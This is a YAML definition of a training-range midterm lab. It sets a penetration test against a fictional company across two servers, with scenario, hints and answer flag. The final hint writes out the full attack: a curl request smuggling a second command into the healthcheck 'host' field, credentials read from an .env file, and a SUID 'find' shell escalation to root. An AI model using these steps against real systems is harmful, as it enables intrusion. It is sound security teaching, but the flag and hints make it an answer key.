title: Nexus Dynamics - Full Penetration Test (Midterm)
category: assessment
difficulty: advanced
estimated_time: 90
prerequisites:
  - linux-9-2-cryptovault-recovery-operation
# By completion students will be able to:
learning_outcomes:
  - Enumerate services across multiple target systems
  - Identify and exploit a web application vulnerability for initial access
  - Discover credentials stored in application files
  - Pivot laterally to an internal server using discovered credentials
  - Escalate privileges on the internal server to achieve root access
mapped_skills:
  - incident_forensics
  - network_systems
assessment_criteria:
  - Submit the correct flag.
  - Pass every automated test step in the lab manifest.
mitre_attack:
  - tactic: Lateral Movement
    technique: T1021
    technique_name: Remote Services
    detection: Correlate remote logons across hosts and protocols.

owner: "OpenCyberRange Curriculum"
content_version: "2.5.3"
reviewed_at: "2026-11-08"
review_status: "automated static proof; live walkthrough pending"
description: "Conduct a full penetration test against Nexus Dynamics' infrastructure. Chain together web exploitation, credential discovery, and privilege escalation across two servers to prove complete compromise."

randomize_ip_offsets: true
visibility: course
week: 9
flag: "OCR{br34ch_3sc4l4t3_0wn3d}"

scenario: |
  Nexus Dynamics is a growing SaaS company based in Atlanta, Georgia. They've
  hired your firm for a full-scope penetration test before their Series B
  funding round. The board wants assurance that their infrastructure is secure.

  Your point of contact is Andrea Walsh (VP of Security): "We have a perimeter
  web server that runs our marketing site and customer API. Behind that is our
  core application server that handles the heavy lifting. The web server is
  the only thing exposed to the internet - the core server should be completely
  unreachable from outside."

  This is your midterm assessment. You'll need to combine skills from multiple
  weeks: enumeration, web exploitation, credential hunting, lateral movement,
  and privilege escalation. Three assessment markers are distributed across
  the infrastructure. Retrieve all three to demonstrate full compromise.

  No hints are available for the first 20 minutes. This is a test.

credentials: []

hints:
  - text: |
      Start with the perimeter server. Run nmap to discover services. The web
      application has a diagnostic feature that accepts user input - test it
      for injection vulnerabilities. Once you can execute commands, search for
      credentials that connect to the core server.
    unlock_after_minutes: 20
  - text: |
      The web server has command injection on /healthcheck (POST with host=
      parameter). Inject commands to read files. Look in /var/www/nexus-app/
      for configuration files containing SSH credentials for the core server.
      Marker 1 is in /opt/nexus/assessment/marker1.txt on the perimeter server.
    unlock_after_minutes: 35
  - text: |
      Perimeter: curl -X POST http://<perimeter>/healthcheck -d "host=127.0.0.1;cat /opt/nexus/assessment/marker1.txt"
      Then: cat /var/www/nexus-app/.env to find CORE_SSH_USER=deploy, CORE_SSH_PASS=N3xus_D3pl0y#
      Core server: ssh deploy@<core> with the discovered password.
      On the core server, find has SUID: find . -exec /bin/sh -p \; -quit
      Marker 2: /home/deploy/marker2.txt, Marker 3: /root/marker3.txt
    unlock_after_minutes: 50

